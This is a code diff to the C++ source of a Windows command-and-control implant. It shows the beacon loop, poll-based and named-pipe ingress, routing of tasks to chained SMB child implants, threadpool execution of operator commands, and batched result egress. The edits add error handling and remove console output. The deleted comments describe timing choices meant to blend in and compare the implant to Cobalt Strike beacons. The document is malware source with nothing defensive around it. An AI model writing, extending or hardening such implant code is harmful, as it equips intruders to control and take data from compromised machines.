@@ -86,11 +86,9 @@ while (true) {
 #include "comms/transport.h"
 #include <queue>
 #include <mutex>
-#include <iostream>
 #include <thread>
 #include <vector>
 #include <string>
-#include "data/msgpack/msgpack.h"
 #include "systems/childhandler.h"
 #include "protocols/smb/smb.h"
 #include "comms/queues.h"
@@ -123,7 +121,6 @@ VOID CALLBACK ChildRouterWorker(PTP_CALLBACK_INSTANCE Instance, PVOID Context, P
     ChildRouteInfo cri;
     if (!ChildHandler::instance().get_child(ctx->implant_uuid, cri)) {
         DEBUG_LOG("[-] [ChildRouterWorker] Route lookup failed for child UUID: " << ctx->implant_uuid);
-        std::cerr << "[-] Route lookup failed for child UUID: " << ctx->implant_uuid << std::endl;
         delete ctx;
         WinApi::CloseThreadpoolWork(Work);
         return;
@@ -174,37 +171,34 @@ void C2Implant::dispatch_to_child_router(const nlohmann::json& task, const std::
     }
     else {
         DEBUG_LOG("[-] [C2Implant::dispatch_to_child_router] FAILED to create threadpool work");
-        std::cerr << "[-] Failed to create threadpool work for child router." << std::endl;
         delete ctx;
     }
 }
 
-//local task
 VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
-    // 1. Recover task data from the heap
     nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
     nlohmann::json task_data = *task_ptr;
     DEBUG_LOG("[TaskHandler] Background worker starting execution for task_uuid: " << task_data["task_uuid"]);
 
-    // 2. Execute the actual command (ls, cd, bof, etc)
-    nlohmann::json result = command_tree(task_data);
+    nlohmann::json result;
+    try {
+        result = command_tree(task_data);
+    }
+    catch (const std::exception& e) {
+        DEBUG_LOG("[TaskHandler] command_tree threw: " << e.what());
+        result["data"] = std::string("Internal error: ") + e.what();
+        result["windows_error_code"] = ERROR_INTERNAL_ERROR;
+        result["message"] = "Task execution failed";
+    }
 
-    // 3. Ensure the response is linked to the original tasking
     result["task_uuid"] = task_data["task_uuid"];
 
-    // 4. Safely queue the result for the egress transport
-    //{
-    //  std::lock_guard<std::mutex> lock(queue_mutex);
-    //  response_queue.push(result);
-    //}
     DEBUG_LOG("[TaskHandler] Command finished. Pushing result to PostQueue.");
     PostQueue::push(result);
 
-    // 5. Wake up the main cycle() loop to send the response
     DEBUG_LOG("[TaskHandler] Signaling h_data_ready_event");
     WinApi::SetEvent(h_data_ready_event);
 
-    // 6. Cleanup
     delete task_ptr;
     WinApi::CloseThreadpoolWork(Work);
 }
@@ -271,10 +265,9 @@ void C2Implant::init() {
     SettingsManager::instance().set("comms_get_function", "[[ init_get_namespace ]]");
     SettingsManager::instance().set("comms_post_function", "[[ init_post_namespace ]]");
 
-    // Initialize the synchronization event
     if (h_data_ready_event == NULL) {
         DEBUG_LOG("[C2Implant::init] Creating h_data_ready_event");
-        h_data_ready_event = CreateEventW(NULL, FALSE, FALSE, NULL);
+        h_data_ready_event = WinApi::CreateEventW(NULL, FALSE, FALSE, NULL);
     }
 
     // Build the transports for the first time, so the pointers exist
@@ -319,10 +312,9 @@ void C2Implant::update_transports() {
     [% endfor %]
     /* END TEMPLATE MEEEE */
 
-    // Initialization Catch-All
     if (current_ingress_ != nullptr) {
         if (!current_ingress_->initialize()) {
-            std::cerr << "[-] Failed to initialize Ingress transport: " << get_strat << std::endl;
+            DEBUG_LOG("[-] Failed to initialize Ingress transport: " << get_strat);
         }
     }
 
@@ -408,102 +400,43 @@ void C2Implant::cycle() {
             result = WinApi::WaitForSingleObject(h_data_ready_event, timeout);
         }
 
-        // --- Event Handling/Dispatcher ---
-        /*
-           This block functions as a state machine that handles the transition
-           between Ingress and Egress communication methods
-
-           The dispatcher accounts for the fundamental difference between:
-           1. POLL-based (Implant-initiated 'Pull')
-            > i.e. HTTP
-           2. HANDLE-based (Kernel-signaled 'Push')
-            > i.e., Named Pipes
-
-            This adds a bit of complexity to the implant, but also allows
-            for protocol switching, and use of handle based methods, like named pipes,
-            on every implant.
-        */
-
-        // ================================================================================
-        // TRIGGER 1: POLL-BASED INGRESS (Wait Timeout)
-        // For transports without a kernel handle (HTTP/DNS), the "GET" is triggered 
-        // by the expiration of the sleep/jitter timer (via WaitForSingleObject)
-        // It's quieter than a Sleep call, and WaitForSingleObject without INFINITE 
-        // should hopefully blend in. 
-        // ================================================================================
-        //if (result == WAIT_TIMEOUT) {
-        //    // This ONLY triggers when the 5 seconds pass without a worker finishing.
-        //    // It ensures we consistently "GET" even if we haven't just "POSTed" something.
-        //    // nlohmann::json task = ingress->fetch_task(implant_uuid_);
-        //    // if (!task.is_null() && task.contains("task_uuid")) {
-        //    //     dispatch_to_threadpool(task);
-        //    // }
-        //    // }
+        // TRIGGER 1: Poll-based ingress (timeout = time to beacon)
         if (result == WAIT_TIMEOUT) {
             DEBUG_LOG("Poll Based Ingress Triggered via Timeout");
-
-            nlohmann::json incoming = current_ingress_->get(implant_uuid_);
-
-            handle_tasks(incoming);
-
+            try {
+                nlohmann::json incoming = current_ingress_->get(implant_uuid_);
+                handle_tasks(incoming);
+            }
+            catch (const std::exception& e) {
+                DEBUG_LOG("[!] Ingress get() threw: " << e.what());
+            }
         }
-        // ================================================================================
-        // TRIGGER 2: HANDLE-BASED INGRESS (Kernel Signal)
-        // For transports with a kernel handle (Pipes/Sockets), the Windows Kernel 
-        // signals this thread as soon as data arrives, bypassing the need for a timer/polling.
-        // ex, parent implant writes task to our SMB inbox pipe
-        // ================================================================================
-        /*
-        Quick note - smb/handle beacons act whenever they get data. It's my understanding
-        this is "fine", as:
-        1. you already have a foothold and data is (presumably) not leaving the network
-            > unless someone is fucking crazy, has SMB open on their external FW, you
-              run an implant on your own host, and point that implant at the SMB child Implant
-              through that FW.
-
-        2. It adds a lot of delay with chained beacons, if every single one has it's own sleep
-        timer to wait for.
-
-        It also appears (from playing with Cobalt Beacons) that they operate in "realtime" over
-        SMB anyways, so if they can do it so can we?
-
-        Who knows. Just something to be aware of.
-
-        TLDR: SMB/handle comms via Implant have  no set sleep time. When it gets data, it acts, as fast or as slow as that is.
-        */
+        // TRIGGER 2: Handle-based ingress (pipe/socket kernel signal)
         else if (h_in_event != NULL && result == WAIT_OBJECT_0) {
             DEBUG_LOG("Handle Based Ingress Triggered (Pipe Signal)");
-            nlohmann::json incoming = current_ingress_->get(implant_uuid_);
-
-            handle_tasks(incoming);
+            try {
+                nlohmann::json incoming = current_ingress_->get(implant_uuid_);
+                handle_tasks(incoming);
+            }
+            catch (const std::exception& e) {
+                DEBUG_LOG("[!] Ingress get() threw: " << e.what());
+            }
         }
-
-        // ================================================================================
-        // TRIGGER 3: WORKER COMPLETION (Internal Signal)
-        // Regardless of the ingress method, this triggers when a background worker 
-        // finishes a command and places the result in the response_queue. This is our 
-        // (literal) signal to send back our data. 
-        // ================================================================================
+        // TRIGGER 3: Worker completion (background task finished, drain PostQueue)
         else if (result == WAIT_OBJECT_0 || (h_in_event != NULL && result == WAIT_OBJECT_0 + 1)) {
             DEBUG_LOG("Worker completed event signaled. Draining PostQueue...");
 
             std::lock_guard<std::mutex> lock(PostQueue::mutex);
             if (!PostQueue::post_queue.empty()) {
-                //lol why the double if
-                // Drain the queue and pack it into a single json array
-                if (!PostQueue::post_queue.empty()) {
-                    DEBUG_LOG("[C2Implant::cycle] Creating batched response for " << PostQueue::post_queue.size() << " items");
-                    nlohmann::json batched_json = create_batched_task_json(implant_uuid_, PostQueue::post_queue);
+                DEBUG_LOG("[C2Implant::cycle] Creating batched response for " << PostQueue::post_queue.size() << " items");
+                nlohmann::json batched_json = create_batched_task_json(implant_uuid_, PostQueue::post_queue);
 
-                    // Then give the JSON to the egress method to do what it needs for network transport
-                    //currently, msgpack
-                    DEBUG_LOG("[C2Implant::cycle] Dispatching batched JSON to Egress Transport");
+                try {
                     current_egress_->send_response(implant_uuid_, batched_json);
-
-                } //lock goes out of scope here, and unlocks
-            }
-            else {
-                DEBUG_LOG("[C2Implant::cycle] Worker event fired but queue was empty? (Spurious wake)");
+                }
+                catch (const std::exception& e) {
+                    DEBUG_LOG("[!] Egress send_response() threw: " << e.what());
+                }
             }
         }
     }
